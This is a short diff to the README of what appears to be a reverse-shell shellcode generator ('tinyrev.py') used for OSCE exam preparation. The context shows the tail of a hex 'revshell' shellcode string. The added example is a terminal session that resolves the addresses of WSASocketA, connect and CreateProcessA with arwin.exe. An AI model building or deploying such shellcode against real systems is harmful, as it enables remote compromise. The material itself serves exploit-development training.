@@ -37,6 +37,14 @@ revshell += "\x52\xbb\x82\x20\xa4\x76\xff\xd3"
 STACK ALIGNMENT NOT INCLUDED! ;)
 ```
 
+## Example 2
+
+```terminal_session
+root@kali:~/OSCE/ # python tinyrev.py --arwin                            
+To Retrieve WSASocketA Address: arwin.exe ws2_32 WSASocketA
+To Retrieve connect Address: arwin.exe ws2_32 connect
+To Retrieve CreateProcessA Address: arwin.exe kernel32 CreateProcessA
+```
 
 ## Thanks to absolomb who is a genius.
 
